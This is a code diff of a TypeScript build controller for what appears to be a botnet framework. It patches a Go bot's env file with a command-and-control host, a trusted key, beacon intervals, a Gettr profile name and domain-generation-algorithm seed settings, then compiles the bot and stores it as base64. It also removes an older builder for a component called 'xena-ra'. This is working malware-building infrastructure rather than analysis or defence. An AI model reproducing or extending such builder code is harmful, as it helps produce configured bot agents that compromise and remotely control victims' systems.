@@ -68,7 +68,9 @@ export default class BuildsController {
         return response.internalServerError({ success: false, message: 'Not yet implemented.' })
 
       case 'XENA_BOT_APEP':
-        const apep = await this.buildApep(buildId, buildProfileId)
+        const apep = await this.buildApep(buildId, buildProfileId, buildProfile.config.atilaHost!, buildProfile.config.trustedPublicKey!,
+          buildProfile.config.maxLoopWait!, buildProfile.config.minLoopWait!, buildProfile.config.gettrProfileName!,
+          buildProfile.config.dgaSeed!, buildProfile.config.dgaAfterDays!)
         return apep
           ? response.ok(apep)
           : response.internalServerError({ success: false, message: 'Failed to build.' })
@@ -194,11 +196,38 @@ export default class BuildsController {
     return build.toBinary
   }
 
-  private buildApep = async (buildId: string, buildProfileId: string) => {
+  private buildApep = async (
+    buildId: string,
+    buildProfileId: string,
+    atilaHost: string,
+    trustedPublicKey: string,
+    maxLoopWait: string,
+    minLoopWait: string,
+    gettrProfileName: string,
+    dgaSeed: string,
+    dgaAfterDays: string,
+  ) => {
+    fs.renameSync(
+      `${Service.Git.pathPrefix}${buildId}/bots/xena-bot-apep/env.example`,
+      `${Service.Git.pathPrefix}${buildId}/bots/xena-bot-apep/env.go`,
+    )
+
+    const envContent = fs.readFileSync(`${Service.Git.pathPrefix}${buildId}/bots/xena-bot-apep/env.go`)
+      .toString()
+      .replace('http://127.0.0.1:60666', atilaHost)
+      .replace('-----BEGIN PUBLIC KEY-----\\n1\\n2\\n3\\n4\\n5\\n6\\n7\\n8\\n9\\n10\\n11\\n12\\n-----END PUBLIC KEY-----\\n', trustedPublicKey)
+      .replace('var maxLoopWait int = 10', `var maxLoopWait int = ${maxLoopWait}`)
+      .replace('var minLoopWait int = 5', `var minLoopWait int = ${minLoopWait}`)
+      .replace('var gettrProfileName string = ""', `var gettrProfileName string = "${gettrProfileName}"`)
+      .replace('var dgaSeed = 123', `var dgaSeed = ${dgaSeed}`)
+      .replace('var dgaAfterDays = 7', `var dgaAfterDays = ${dgaAfterDays}`)
+    
+    fs.writeFileSync(`${Service.Git.pathPrefix}${buildId}/bots/xena-bot-apep/env.go`, envContent)
+
     // Build the binary.
     const buildOutput = (() => {
       const buildCommand =
-        `cd ${Service.Git.pathPrefix}${buildId}/bots/xena-bot-apep && go build` // -o ${Env.get('BUILD_DESTINATION')}${buildId}_BUILD
+        `cd ${Service.Git.pathPrefix}${buildId}/bots/xena-bot-apep && sh build.sh` // -o ${Env.get('BUILD_DESTINATION')}${buildId}_BUILD
       try {
         return Helper.Shell.exe(buildCommand)
       } catch (e) {
@@ -210,13 +239,13 @@ export default class BuildsController {
     if (buildOutput == 'ERROR')
       throw Error('Unable to build.')
 
-    const botLocation = `${Env.get('BUILD_DESTINATION')}${buildId}/bots/xena-bot-apep/xena-apep`
+    const botLocation = `${Env.get('BUILD_DESTINATION')}${buildId}/bots/xena-bot-apep/build/main_linux_64`
 
     // Base64 binary.
     const base64Binary = await Domain.Build.getBinary(botLocation)
 
     // Store the build.
-    const build = await Repo.Build.insert( Domain.Build.fromJSON({
+    const build = await Repo.Build.insert(Domain.Build.fromJSON({
       id: buildId,
       buildProfileId, 
       data: base64Binary,
@@ -229,43 +258,6 @@ export default class BuildsController {
       console.warn(e)
       return 'ERROR'
     }
-
-    // Return the build binary.
-    return build.toBinary
-  }
-
-  private buildRa = async (buildId: string, buildProfileId: string) => {
-    // Build the binary.
-    const buildOutput = (() => {
-      try {
-        return Helper.Shell.exe(`cd ${Service.Git.pathPrefix}${buildId}/xena-ra && yarn && yarn build`)
-      } catch (e) {
-        console.warn('Unable to build the binary output.')
-        console.warn(e)
-        return 'ERROR'
-      }
-    })()
-  
-    if (buildOutput == 'ERROR')
-      throw Error('Unable to clone Git repository.')
-    
-    // Repo cleaning.
-    // try {
-    //   Helper.Shell.exe(`rm -r ${Service.Git.pathPrefix}${buildId}`)
-    // } catch (e) {
-    //   console.warn(e)
-    //   return 'ERROR'
-    // }
-
-    // Base64 binary.
-    const base64Binary = await Domain.Build.getBinary(`${Env.get('BUILD_DESTINATION')}${buildId}`)
-
-    // Store the build.
-    const build = await Repo.Build.insert( Domain.Build.fromJSON({
-      id: buildId,
-      buildProfileId, 
-      data: base64Binary,
-    })).then(build => Domain.Build.fromJSON(build))
 
     // Return the build binary.
     return build.toBinary
